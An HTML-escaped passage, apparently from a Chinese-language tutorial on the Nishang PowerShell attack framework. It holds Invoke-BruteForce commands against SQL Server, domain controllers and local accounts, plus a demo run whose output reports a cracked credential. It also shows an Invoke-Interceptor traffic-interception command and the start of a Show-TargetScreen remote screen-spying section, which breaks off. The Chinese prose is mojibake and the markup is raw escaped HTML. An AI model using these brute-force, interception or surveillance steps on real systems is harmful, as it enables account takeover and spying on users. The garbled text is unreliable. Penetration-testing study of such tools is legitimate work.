&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Active&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Directory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Local&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Accounts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Web&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FTP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;--------------------------&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EXAMPLE&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-BruteForce&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComputerName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQLServ01&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-UserList&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;-PasswordList&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordlist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Verbose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Brute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQLServ01&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;listed&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;passwords&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wordlist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;--------------------------&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EXAMPLE&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-BruteForce&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComputerName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;targetdomain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;com&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-UserList&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PasswordList&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordlist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Service&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ActiveDirectory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-StopOnSuccess&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Verbose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Brute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Controller&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;targetdomain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;com&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;listed&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwords&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wordlist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Since&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StopOnSuccess&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;specified&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;brute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;forcing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stops&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;first&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;--------------------------&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EXAMPLE&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-BruteForce&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComputerName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;targetmachine&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-UserList&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PasswordList&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordlist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Service&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;LocalAccounts&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-StopOnSuccess&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Verbose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Brute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mahcine&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;listed&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;passwords&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wordlist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Since&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StopOnSuccess&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;specified&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;brute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;forcing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stops&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;first&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;--------------------------&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EXAMPLE&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;cat &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;servers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-BruteForce&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-UserList&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PasswordList&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordlist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Verbose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Brute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;all&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;servers&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;specified&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;servers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬é€‰ç”¨EXAMPLE 3æ¥æµ‹è¯•ä¸€ä¸‹ï¼Œæ–°å»º&lt;code&gt;users.txt&lt;/code&gt;å’Œ&lt;code&gt;wordlist.txt&lt;/code&gt;æ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸Šéœ€è¦çˆ†ç ´çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç„¶åæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc92n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-BruteForce&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComputerName&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;WIN-JH8N3KV3OQ0&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-UserList&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PasswordList&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wordlist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LocalAccounts&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-StopOnSuccess&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Verbose&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Delay&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;VERBOSE&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Starting&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Brute-Force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Delay&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Jitter&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Brute&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Forcing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Local&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Accounts&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;WIN-JH8N3KV3OQ0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;VERBOSE&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc92n&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@ssw0rd&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;then&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sleeping&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;seconds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Match&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;!&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc92n&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@ssw0rd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°å·²ç»çˆ†ç ´æˆåŠŸäº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å—…æ¢å¾…å®Œå–„&#34;&gt;å—…æ¢ï¼ˆå¾…å®Œå–„ï¼‰&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªåŠŸèƒ½æˆ‘è®°å¾—ä»¥å‰2008å¹´çš„æ—¶å€™ï¼Œå¾ˆå¤šé»‘å®¢è®ºå›éƒ½è¢«ä¸€ä¸ªå›¢é˜Ÿåˆ©ç”¨NetFukeå·¥å…·è¿›è¡ŒARPæ¬ºéª—ç­‰æ–¹å¼ï¼Œåœ¨å½“æ—¶æ„Ÿè§‰ç‰¹åˆ«ç‰›ï¼Œéƒ½æ˜¯è€è„šæœ¬å°å­äº†ã€‚æˆ‘ä»¬åœ¨å—…æ¢ä¸­é™¤äº†ä¸Šé¢çš„Netfukeè¿˜æœ‰å¤§åé¼é¼çš„cainã€Ettercapç­‰ã€‚é‡Œé¢æœ‰ç”¨åˆ°ä¸€ä¸ªæŠ€æœ¯å°±æ˜¯ä¸­é—´äººæ”»å‡»ï¼Œå¯ä»¥çœ‹ä¸‹è¿™ç¯‡æ–‡ç« ç§‘æ™®ä¸€ä¸‹ï¼šhttps://blog.csdn.net/tangCprogranm/article/details/84558652 ï¼Œç°åœ¨åŸºæœ¬å¾ˆå°‘äº†ï¼Œå› ä¸ºå„å¤§å…¬å¸éƒ½å¼•å…¥äº†IDSã€é˜²ç«å¢™ã€ä¸¥æ ¼åˆ’åˆ†VLANç­‰æªæ–½ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯Nishangè¿™ä¸ªæ¨¡å—Invoke-Interceptorä¸åƒæ˜¯ä¸€ç§å¾ˆå¥½çš„å—…æ¢&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Invoke-Interceptor -ProxyServer 172.16.0.107 -ProxyPort 9999
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;å±å¹•çªƒå–&#34;&gt;å±å¹•çªƒå–&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨çš„æ˜¯&lt;code&gt;Show-TargetScreen&lt;/code&gt;æ¨¡å—ï¼Œè¿™ä¸ªæ¨¡å—åˆ†ä¸ºæ­£å‘è¿æ¥å’Œåå‘è¿æ¥ï¼Œä¸»è¦åŠŸèƒ½å°±æ˜¯ç”¨æ¥å®æ—¶ç›‘æ§ç›®æ ‡ä¸»æœºçš„å±å¹•ã€‚&lt;/p&gt;
&lt;p&gt;å‚æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-IPAddress åé¢åŠ IPåœ°å€ï¼ˆåå‘é“¾æ¥éœ€è¦ï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Port åŠ ç«¯å£
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-Bind æ­£å‘è¿æ¥
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;åå‘è¿æ¥&lt;/p&gt;
&lt;p&gt;åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
